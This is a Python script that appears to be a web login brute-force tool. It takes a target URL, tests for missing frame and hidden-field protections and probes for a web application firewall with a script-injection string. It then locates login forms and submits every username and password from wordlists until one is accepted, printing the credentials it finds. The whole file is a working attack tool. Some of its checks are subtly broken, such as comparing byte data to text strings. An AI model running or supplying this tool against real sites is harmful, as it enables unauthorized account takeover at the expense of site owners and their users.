#!/usr/bin/env python3
# Modules
import mechanize
import itertools
import http.cookiejar as cookielib
import sys
from bs4 import BeautifulSoup
import re
from urllib.request import urlopen
from urllib.error import URLError

# Mechanize browser setup
br = mechanize.Browser()
cookies = cookielib.LWPCookieJar()
br.set_cookiejar(cookies)
br.set_handle_equiv(True)
br.set_handle_redirect(True)
br.set_handle_referer(True)
br.set_handle_robots(False)
br.set_debug_http(False)
br.set_debug_responses(False)
br.set_debug_redirects(False)
br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)
br.addheaders = [
    ('User-agent', 'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.1) Gecko/2008071615 Fedora/3.0.1-1.fc9 Firefox/3.0.1'),
    ('Accept', 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'), 
    ('Accept-Encoding', 'br')
]

# Banner
print('''\033[1;93m
 _   _ _____ ____  
| \ | |_   _|  _ \ 
|  \| | | | | | | |
| |\  | | | | |_| |
|_| \_| |_| |____/ 
\033[1;34m
''')

url = input('\033[1;34m[?]\033[0m Enter target URL: ')

# URL validation and modification
if not url.startswith(('http://', 'https://')):
    url = 'http://' + url
try:
    br.open(url, timeout=10.0)
except URLError:
    url = 'https://' + url
    br.open(url)

forms = br.forms()
headers = str(urlopen(url).headers).lower()

if 'x-frame-options:' not in headers:
    print('\033[1;32m[+]\033[0m Heuristic found a Clickjacking Vulnerability')
if 'cloudflare-nginx' in headers:
    print('\033[1;31m[-]\033[0m Target is protected by Cloudflare')

data = br.open(url).read()
if 'type="hidden"' not in data:
    print('\033[1;32m[+]\033[0m Heuristic found a CSRF Vulnerability')

soup = BeautifulSoup(data, 'html.parser')
i_title = soup.find('title')
original = i_title.contents if i_title else None

# WAF Detection
def WAF_detector():
    noise = "?=<script>alert()</script>"
    fuzz = url + noise
    try:
        res1 = urlopen(fuzz)
        code = res1.getcode()
        if code == 406 or code == 501:
            print("\033[1;31m[-]\033[1;m WAF Detected: Mod_Security")
        elif code == 999:
            print("\033[1;31m[-]\033[1;m WAF Detected: WebKnight")
        elif code == 419:
            print("\033[1;31m[-]\033[1;m WAF Detected: F5 BIG IP")
        elif code == 403:
            print("\033[1;31m[-]\033[1;m Unknown WAF Detected")
    except URLError as e:
        print(f"Error checking WAF: {e}")

WAF_detector()

# Load wordlists
def wordlist_u(lst):
    try:
        with open('usernames.txt', 'r') as f:
            lst.extend(line.strip() for line in f)
    except IOError:
        print("\033[1;31m[-]\033[1;m Wordlist not found!")
        sys.exit()

def wordlist_p(lst):
    try:
        with open('passwords.txt', 'r') as f:
            lst.extend(line.strip() for line in f)
    except IOError:
        print("\033[1;31m[-]\033[1;m Wordlist not found!")
        sys.exit()

usernames = []
wordlist_u(usernames)
print(f'\033[1;97m[>]\033[1;m Usernames loaded: {len(usernames)}')

passwords = []
wordlist_p(passwords)
print(f'\033[1;97m[>]\033[1;m Passwords loaded: {len(passwords)}')

# Form finding and brute force
def find():
    form_number = 0
    for f in forms:
        data = str(f)
        username = re.search(r'<TextControl\([^<]*=\)>', data)
        if username:
            username = username.group().split('<TextControl(')[1][:-3]
            print(f'\033[1;33m[!]\033[0m Username field: {username}')
            passwd = re.search(r'<PasswordControl\([^<]*=\)>', data)
            if passwd:
                passwd = passwd.group().split('<PasswordControl(')[1][:-3]
                print(f'\033[1;33m[!]\033[0m Password field: {passwd}')
                menu, option, name = "False", "", ""
                try:
                    brute(username, passwd, menu, option, name, form_number)
                except Exception as e:
                    cannotUseBruteForce(username, e)
            form_number += 1
    print('\033[1;31m[-]\033[0m No forms found')

def cannotUseBruteForce(username, e):
    print(f'\033[1;31m[!]\033[0m Cannot use brute force with user {username}. [Error: {e}]')

def brute(username, passwd, menu, option, name, form_number):
    for uname in usernames:
        print(f'\033[1;97m[>]\033[1;m Bruteforcing username: {uname}')
        for progress, password in enumerate(passwords, start=1):
            sys.stdout.write(f'\r\033[1;97m[>]\033[1;m Passwords tried: {progress} / {len(passwords)}')
            sys.stdout.flush()
            br.open(url)
            br.select_form(nr=form_number)
            br.form[username] = uname
            br.form[passwd] = password
            if menu == "True":
                br.form[name] = [option]
            resp = br.submit()
            data = resp.read().lower()
            if 'username or password' not in data:
                print('\n\033[1;32m[+]\033[0m Valid credentials found:')
                print(f'\033[1;32mUsername: \033[0m{uname}')
                print(f'\033[1;32mPassword: \033[0m{password}')
                sys.exit()
    print('\033[1;31m[-]\033[0m Failed to crack login credentials')
    sys.exit()

find()
